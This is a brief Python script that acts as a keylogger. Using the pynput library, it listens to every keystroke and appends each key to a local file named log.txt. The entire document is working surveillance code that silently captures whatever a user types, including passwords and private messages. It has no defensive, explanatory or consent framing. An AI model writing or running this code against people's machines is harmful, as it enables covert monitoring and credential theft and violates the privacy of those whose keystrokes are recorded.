#Storing key strokes in text file
from pynput.keyboard import Listener


def writefile(key):
    letter = str(key)
    letter = letter.replace("'","")
    with open('log.txt','a') as f:
        f.write(str(letter))



with Listener(on_press = writefile) as l:
    l.join()
    
    
